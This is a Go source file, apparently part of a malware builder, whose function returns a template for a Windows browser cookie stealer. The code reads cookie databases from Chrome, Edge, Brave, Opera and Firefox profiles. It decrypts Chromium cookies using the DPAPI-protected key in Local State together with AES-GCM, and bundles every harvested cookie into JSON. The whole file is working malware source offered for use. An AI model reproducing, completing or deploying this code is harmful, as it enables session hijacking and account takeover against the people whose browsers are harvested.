package buildergen

import "strings"

func templateStealer() string {
	return strings.TrimSpace(`

// ── stealer ──

func runStealer() string {
	log.Println("[stealer] starting...")
	results := map[string]string{}

	browsers := []struct {
		name  string
		paths []string
	}{
		{"Chrome", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
		}},
		{"Edge", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
		}},
		{"Brave", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
		}},
		{"Opera", []string{
			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"),
			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
		}},
		{"Firefox", []string{
			filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
		}},
	}

	for _, br := range browsers {
		for _, basePath := range br.paths {
			if _, err := os.Stat(basePath); os.IsNotExist(err) {
				continue
			}

			var cookies string
			if br.name == "Firefox" {
				cookies = stealFirefoxCookies(basePath)
			} else {
				cookies = stealChromiumCookies(basePath, br.name)
			}

			if cookies != "" {
				if prev, ok := results[br.name]; ok {
					results[br.name] = prev + "\n" + cookies
				} else {
					results[br.name] = cookies
				}
			}
		}
	}

	if len(results) == 0 {
		log.Println("[stealer] no results found")
		return ""
	}

	log.Printf("[stealer] found %d browsers with data", len(results))
	out, _ := json.Marshal(results)
	return string(out)
}

func stealChromiumCookies(userDataPath string, browserName string) string {
	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"}
	var allCookies strings.Builder

	for _, profile := range profiles {
		cookiePath := filepath.Join(userDataPath, profile, "Network", "Cookies")
		if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
			cookiePath = filepath.Join(userDataPath, profile, "Cookies")
			if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
				continue
			}
		}

		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_cookies_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
		copyFileSimple(cookiePath, tmpPath)
		defer os.Remove(tmpPath)

		db, err := sql.Open("sqlite3", tmpPath+"?mode=ro&_journal_mode=WAL")
		if err != nil {
			continue
		}

		rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
		if err != nil {
			db.Close()
			continue
		}

		for rows.Next() {
			var host, name, path string
			var encValue []byte
			var expires int64
			if err := rows.Scan(&host, &name, &path, &encValue, &expires); err != nil {
				continue
			}

			value := decryptCookieValue(encValue, userDataPath)

			allCookies.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n",
				host, name, value, path, expires))
		}
		rows.Close()
		db.Close()
	}

	return allCookies.String()
}

func stealFirefoxCookies(profilesPath string) string {
	var allCookies strings.Builder

	entries, err := os.ReadDir(profilesPath)
	if err != nil {
		return ""
	}

	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		cookiePath := filepath.Join(profilesPath, e.Name(), "cookies.sqlite")
		if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
			continue
		}

		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ff_cookies_%s_%d", e.Name(), time.Now().UnixNano()))
		copyFileSimple(cookiePath, tmpPath)
		defer os.Remove(tmpPath)

		db, err := sql.Open("sqlite3", tmpPath+"?mode=ro")
		if err != nil {
			continue
		}

		rows, err := db.Query("SELECT host, name, path, value, expiry FROM moz_cookies")
		if err != nil {
			db.Close()
			continue
		}

		for rows.Next() {
			var host, name, path, value string
			var expiry int64
			if err := rows.Scan(&host, &name, &path, &value, &expiry); err != nil {
				continue
			}
			allCookies.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n",
				host, name, value, path, expiry))
		}
		rows.Close()
		db.Close()
	}

	return allCookies.String()
}

func decryptCookieValue(encValue []byte, userDataPath string) string {
	if len(encValue) == 0 {
		return ""
	}

	if len(encValue) > 3 && string(encValue[:3]) == "v10" {
		localStatePath := filepath.Join(userDataPath, "Local State")
		key := getChromiumKey(localStatePath)
		if key == nil {
			return "(encrypted)"
		}
		nonce := encValue[3:15]
		ciphertext := encValue[15:]
		block, err := aes.NewCipher(key)
		if err != nil {
			return "(encrypted)"
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "(encrypted)"
		}
		plain, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			return "(encrypted)"
		}
		return string(plain)
	}

	out, err := dpapiDecrypt(encValue)
	if err != nil {
		return "(encrypted)"
	}
	return string(out)
}

var chromiumKeyCache = map[string][]byte{}
var chromiumKeyCacheMu sync.Mutex

func getChromiumKey(localStatePath string) []byte {
	chromiumKeyCacheMu.Lock()
	defer chromiumKeyCacheMu.Unlock()

	if k, ok := chromiumKeyCache[localStatePath]; ok {
		return k
	}

	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil
	}

	var state map[string]interface{}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil
	}

	osCrypt, ok := state["os_crypt"].(map[string]interface{})
	if !ok {
		return nil
	}
	encKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil
	}

	encKey, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil {
		return nil
	}

	if len(encKey) < 5 || string(encKey[:5]) != "DPAPI" {
		return nil
	}
	encKey = encKey[5:]

	key, err := dpapiDecrypt(encKey)
	if err != nil {
		return nil
	}

	chromiumKeyCache[localStatePath] = key
	return key
}

type cryptDataBlob struct {
	cbData uint32
	pbData *byte
}

func dpapiDecrypt(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}

	crypt32 := syscall.NewLazyDLL("crypt32.dll")
	proc := crypt32.NewProc("CryptUnprotectData")

	inBlob := cryptDataBlob{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}

	var outBlob cryptDataBlob

	r, _, err := proc.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if r == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %v", err)
	}

	defer func() {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		localFree := kernel32.NewProc("LocalFree")
		_, _, _ = localFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	}()

	result := make([]byte, outBlob.cbData)
	copy(result, unsafe.Slice(outBlob.pbData, outBlob.cbData))
	return result, nil
}

func copyFileSimple(src, dst string) {
	data, err := os.ReadFile(src)
	if err != nil {
		return
	}
	_ = os.WriteFile(dst, data, 0o644)
}
`)
}
